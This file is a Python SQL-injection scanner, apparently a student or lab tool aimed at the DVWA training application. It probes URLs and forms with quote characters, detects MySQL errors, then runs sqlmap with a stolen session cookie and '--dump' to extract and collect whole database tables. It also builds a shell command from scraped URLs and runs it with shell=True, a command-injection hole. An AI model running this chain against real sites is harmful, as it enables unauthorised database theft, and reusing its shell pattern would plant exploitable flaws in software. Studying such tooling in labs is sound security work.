import requests
from bs4 import BeautifulSoup
from subprocess import Popen, PIPE
from .dvwa_login_service import getDVWALogin

s = requests.Session()

def getAllForms(url):
    """Given a `url`, it returns all forms from the HTML content"""
    soup = BeautifulSoup(s.get(url).content, "html.parser")

    return soup.find_all("form")


def getFormDetails(form):
    # Cette fonction va parcourir l'html pour trouver les détails des forms
    
    details = {}

    # Ici on récupère la méthode http du for
    method = form.attrs.get("method", "get").lower()

    # Récupération des autres détails du form
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
    
    details["method"] = method
    details["inputs"] = inputs
    return details


def isVulnerable(response):
    # Cette fonction compare la reponse de l'appel avec le message d'erreur MySQL
    error ="you have an error in your sql syntax;"
    if error in response.content.decode().lower():
        return True
    return False


def scanSQLInjection():
    database = []
    file = open('dirsearch_output_test.txt', 'r')
    file_contents = file.readlines()
    address = ""
    url = ""
    injectableURLs = []
    s.cookies.set("PHPSESSID", getDVWALogin()['PHPSESSID'])
    s.cookies.set("security", "low")

    # Recherche de l'URL pour l'injection SQL
    for line in file_contents:
        address = line[13:].split(' ')[0].strip()

        # Vérification de la validité de l'url
        if "http" in address and not (address.endswith(".php") or address.endswith(".txt") or address.endswith(".ini")):
            url = address
            print("[!] Trying", url)
            for c in "\"'":
                # Ajout de caractères pouvant révéler une vulnerabilitées SQL
                detectUrl = f"{url}{c}"
                res = s.get(detectUrl)
                if isVulnerable(res):
                    print("\t[✅] SQL Injection vulnerability detected, link:", detectUrl)
                    return
            
            # Recover the forms of all pages
            forms = getAllForms(url)
            if len(forms) != 0:
                print(f"\t[✅] Detected {len(forms)} forms on {url}.")
            
            # Boucle for d'essais d'injection dans les forms
            for form in forms:
                form_details = getFormDetails(form)
                data = {}
                sqlmapData = {}
                for input_tag in form_details["inputs"]:
                    if input_tag["value"] or input_tag["type"] == "hidden":
                        try:
                            data[input_tag["name"]] = input_tag["value"] + "'"
                            sqlmapData[input_tag["name"]] = input_tag["value"]
                        except:
                            pass
                    elif input_tag["type"] != "submit":
                        data[input_tag["name"]] = f"Submit'"
                        sqlmapData[input_tag["name"]] = f"Submit"
                if form_details["method"] == "post":
                    res = s.post(url, data=data)
                elif form_details["method"] == "get":
                    res = s.get(url, params=data)

                # Verification de la réponse pour déterminer la possibilité de l'injection
                if isVulnerable(res):
                    res = s.get(url, params=sqlmapData)
                    injectableURLs.append(res.url)
                    print("\t[✅] SQL Injection vulnerability detected, link:", res.url)
                    print('\t[i] Trying to dump database using sqlmap:')
                    print('\t\tInjection on ' + res.url)
                    command = "sqlmap -u '" + res.url + "' --cookie='PHPSESSID=" + getDVWALogin()['PHPSESSID'] + ";security=low' --dump --batch"
                    print(command)
                    process = Popen(command, shell=True, stdout=PIPE)
                    for line in process.stdout:
                        if 'dumped to CSV file' in str(line): 
                            table = str(line).split(' ')[3]
                            path = str(line).split(' ')[8]
                            table = table[1:len(table)-1]
                            path = path[1:len(path)-4]
                            print('The '+ table + ' SQL table has been dumped:')
                            f = open(path, 'r')
                            database.append('The '+ table + ' SQL table has been dumped:<br>')
                            for line in f:
                                dump = line.replace(',', '<tab>|')
                                dump = dump.replace('\n', '<br>')
                                database.append(dump)
                    print('#####################################')
                    break 
                else:
                    print("\t[❌] No vulnerability detected, link!")
    return [injectableURLs, database]